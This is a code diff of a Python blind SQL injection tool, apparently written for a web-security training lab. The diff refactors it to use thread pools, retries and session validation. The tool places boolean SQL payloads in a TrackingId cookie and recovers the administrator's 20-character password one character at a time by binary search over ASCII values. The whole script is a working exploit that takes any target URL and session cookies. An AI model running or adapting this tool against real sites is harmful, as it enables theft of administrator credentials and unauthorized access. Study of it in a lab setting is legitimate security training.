@@ -1,7 +1,22 @@
 import requests
 import threading
 import sys
-import readline  # Enables arrow keys, home, end, history
+import readline
+import time
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+# ─── Constants ────────────────────────────────────────────
+MAX_WORKERS    = 20   # Parallel threads
+MAX_RETRIES    = 3    # Retry failed requests
+TIMEOUT        = 10   # Request timeout seconds
+PASSWORD_LEN   = 20   # Password length
+ASCII_LOW      = 32   # Printable ASCII start
+ASCII_HIGH     = 126  # Printable ASCII end
+
+# ─── Shared State ─────────────────────────────────────────
+password    = ['?'] * PASSWORD_LEN
+lock        = threading.Lock()
+found_count = 0
 
 def get_input(prompt):
     """Get input with full keyboard support using readline"""
@@ -9,45 +24,6 @@ def get_input(prompt):
         return input(prompt)
     except EOFError:
         return ''
-
-def check_condition(url, base_tracking_id, session_cookie, pos, operator, value):
-    """Send request and check if Welcome exists in response"""
-    tracking_id = (
-        f"{base_tracking_id}'+AND+"
-        f"(SELECT+ASCII(SUBSTRING(password,{pos},1))+FROM+users+"
-        f"WHERE+username='administrator'){operator}{value}--"
-    )
-    cookies = {
-        "TrackingId": tracking_id,
-        "session": session_cookie
-    }
-    try:
-        r = requests.get(url, cookies=cookies, timeout=10)
-        return "Welcome" in r.text
-    except:
-        return False
-
-def binary_search_char(url, base_tracking_id, session_cookie, pos, password, lock):
-    """Find character at given position using binary search on ASCII range"""
-    low, high = 32, 126
-
-    while low <= high:
-        mid = (low + high) // 2
-
-        if check_condition(url, base_tracking_id, session_cookie, pos, ">", mid):
-            low = mid + 1
-        elif check_condition(url, base_tracking_id, session_cookie, pos, "<", mid):
-            high = mid - 1
-        else:
-            char = chr(mid)
-            with lock:
-                password[pos-1] = char
-                print(f"[+] Position {pos:02d}: '{char}' -> {''.join(password)}")
-            return
-
-    with lock:
-        password[pos-1] = '?'
-        print(f"[-] Position {pos:02d}: not found")
 
 def fix_url(url):
     """Auto fix URL - add https:// if missing and trailing slash"""
@@ -65,7 +41,7 @@ def validate_url(url):
     if ' ' in url:
         return False, "URL cannot contain spaces!"
     if '.' not in url:
-        return False, "Invalid URL format! (e.g. abc123.web-security-academy.net)"
+        return False, "Invalid URL format! (e.g. abc123.example.net)"
     return True, ""
 
 def validate_cookie(value, name):
@@ -88,7 +64,7 @@ def get_valid_input(prompt, validate_func, *args):
 def test_connection(url):
     """Test if URL is reachable"""
     try:
-        r = requests.get(url, timeout=10)
+        r = requests.get(url, timeout=TIMEOUT)
         return True, r.status_code
     except requests.exceptions.ConnectionError:
         return False, "Cannot connect - check URL"
@@ -99,14 +75,85 @@ def test_connection(url):
     except Exception as e:
         return False, str(e)
 
+def send_request(session_obj, url, base_tracking_id, session_cookie, pos, operator, value):
+    """Send single request with retry logic"""
+    tracking_id = (
+        f"{base_tracking_id}'+AND+"
+        f"(SELECT+ASCII(SUBSTRING(password,{pos},1))+FROM+users+"
+        f"WHERE+username='administrator'){operator}{value}--"
+    )
+    cookies = {
+        "TrackingId": tracking_id,
+        "session":    session_cookie
+    }
+
+    for attempt in range(MAX_RETRIES):
+        try:
+            r = session_obj.get(url, cookies=cookies, timeout=TIMEOUT)
+            return "Welcome" in r.text
+        except requests.exceptions.Timeout:
+            if attempt < MAX_RETRIES - 1:
+                time.sleep(0.5 * (attempt + 1))  # Wait longer each retry
+                continue
+            return False
+        except Exception:
+            if attempt < MAX_RETRIES - 1:
+                time.sleep(0.3)
+                continue
+            return False
+    return False
+
+def binary_search_char(session_obj, url, base_tracking_id, session_cookie, pos):
+    """Find character at given position using binary search"""
+    global found_count
+    low, high = ASCII_LOW, ASCII_HIGH
+
+    while low <= high:
+        mid = (low + high) // 2
+
+        if send_request(session_obj, url, base_tracking_id, session_cookie, pos, ">", mid):
+            low = mid + 1
+        elif send_request(session_obj, url, base_tracking_id, session_cookie, pos, "<", mid):
+            high = mid - 1
+        else:
+            # Exact match found
+            char = chr(mid)
+            with lock:
+                password[pos-1] = char
+                found_count += 1
+                progress = f"{found_count}/{PASSWORD_LEN}"
+                print(f"[+] Position {pos:02d}: '{char}' | Progress: {progress} | {''.join(password)}")
+            return pos, char
+
+    # Not found
+    with lock:
+        print(f"[-] Position {pos:02d}: not found")
+    return pos, None
+
+def check_session_valid(session_obj, url, base_tracking_id, session_cookie):
+    """Quick check if cookies are still valid"""
+    try:
+        r = session_obj.get(url, cookies={
+            "TrackingId": base_tracking_id,
+            "session": session_cookie
+        }, timeout=TIMEOUT)
+        # If we get redirected to login, session expired
+        if "login" in r.url.lower():
+            return False
+        return True
+    except:
+        return False
+
 def main():
-    print("=" * 50)
-    print("      Blind SQLi - Binary Search Attack")
-    print("=" * 50)
+    global found_count, password
+
+    print("=" * 55)
+    print("        Blind SQLi - Binary Search Attack")
+    print("=" * 55)
     print()
 
     try:
-        # Get and validate URL
+        # ── Get and validate URL ──
         while True:
             url = get_valid_input("[*] URL        : ", validate_url)
             url = fix_url(url)
@@ -119,41 +166,60 @@ def main():
                 print(f"    [!] {result}")
                 print("    [!] Please enter a valid URL.\n")
 
-        # Get and validate TrackingId
+        # ── Get cookies ──
         tracking_id = get_valid_input("[*] TrackingId : ", validate_cookie, "TrackingId")
+        session     = get_valid_input("[*] Session    : ", validate_cookie, "Session")
 
-        # Get and validate Session
-        session = get_valid_input("[*] Session    : ", validate_cookie, "Session")
+        # ── Validate session before starting ──
+        print("\n[*] Validating cookies...")
+        http_session = requests.Session()  # Reuse TCP connections = faster
+        if not check_session_valid(http_session, url, tracking_id, session):
+            print("[!] Warning: Session may be expired - results could be wrong!")
+        else:
+            print("[+] Cookies OK!\n")
 
-        print(f"\n[*] Target : {url}")
-        print(f"[*] Searching 20 character password...\n")
+        print(f"[*] Target   : {url}")
+        print(f"[*] Threads  : {MAX_WORKERS}")
+        print(f"[*] Retries  : {MAX_RETRIES} per request")
+        print(f"[*] Starting attack...\n")
 
-        password = ['?'] * 20
-        lock = threading.Lock()
+        # Reset state
+        password    = ['?'] * PASSWORD_LEN
+        found_count = 0
+        start_time  = time.time()
 
-        # Launch all 20 positions in parallel threads
-        threads = []
-        for pos in range(1, 21):
-            t = threading.Thread(
-                target=binary_search_char,
-                args=(url, tracking_id, session, pos, password, lock)
-            )
-            threads.append(t)
-            t.start()
+        # ── ThreadPoolExecutor - more efficient than manual threads ──
+        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+            futures = {
+                executor.submit(
+                    binary_search_char,
+                    http_session, url, tracking_id, session, pos
+                ): pos
+                for pos in range(1, PASSWORD_LEN + 1)
+            }
 
-        # Wait for all threads to complete
-        for t in threads:
-            t.join()
+            # Process results as they complete
+            for future in as_completed(futures):
+                try:
+                    future.result()
+                except Exception as e:
+                    pos = futures[future]
+                    print(f"[-] Position {pos:02d} error: {e}")
 
+        elapsed = time.time() - start_time
+
+        # ── Final result ──
+        print("\n" + "=" * 55)
         if '?' in password:
-            print("\n[!] Warning: Some positions failed - cookies may have expired!")
-
-        print("\n" + "=" * 50)
-        print(f"[*] Final Password: {''.join(password)}")
-        print("=" * 50)
+            print("[!] Warning: Some positions failed!")
+            print("[!] Try again with fresh cookies.")
+        print(f"[*] Final Password : {''.join(password)}")
+        print(f"[*] Time Taken     : {elapsed:.2f} seconds")
+        print("=" * 55)
 
     except KeyboardInterrupt:
-        print("\n\n[-] Interrupted by user. Exiting...")
+        print("\n\n[-] Interrupted by user.")
+        print(f"[*] Partial Password: {''.join(password)}")
         sys.exit(0)
 
 if __name__ == "__main__":
